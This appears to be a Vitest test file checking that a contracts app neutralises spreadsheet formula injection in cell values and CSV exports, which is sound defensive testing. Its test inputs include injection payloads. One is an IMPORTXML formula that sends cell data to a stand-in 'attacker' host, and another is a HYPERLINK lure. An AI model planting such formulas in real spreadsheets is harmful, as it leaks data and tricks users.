import { describe, expect, it } from "vitest";

import { neutraliseFormula } from "@/lib/data/sheet-schema";
import { contractsToCsv } from "@/lib/reports/csv";
import { evaluateContracts } from "@/lib/rules/evaluate";
import { makeContract } from "@/lib/rules/test-helpers";

describe("spreadsheet formula safety", () => {
  it.each([
    ["=IMPORTXML(\"http://attacker/\"&A2)", "'=IMPORTXML(\"http://attacker/\"&A2)"],
    ["+1+1", "'+1+1"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\tcmd", "'\tcmd"],
  ])("neutralises %s", (input, expected) => {
    expect(neutraliseFormula(input)).toBe(expected);
  });

  it("leaves ordinary values exactly as they are", () => {
    for (const value of ["Tendai Marufu", "2026-01-01", "CC-2100", "", "Renewal"]) {
      expect(neutraliseFormula(value)).toBe(value);
    }
    expect(neutraliseFormula(5)).toBe(5);
  });

  it("keeps formulas out of the exported CSV", () => {
    const contracts = evaluateContracts(
      [makeContract({ notes: '=HYPERLINK("http://attacker","click")', employeeName: "+Risky Name" })],
      { today: "2026-06-15" },
    );
    const csv = contractsToCsv(contracts);
    expect(csv).toContain("'=HYPERLINK");
    expect(csv).toContain("'+Risky Name");
    expect(csv).not.toMatch(/,=HYPERLINK/);
  });
});
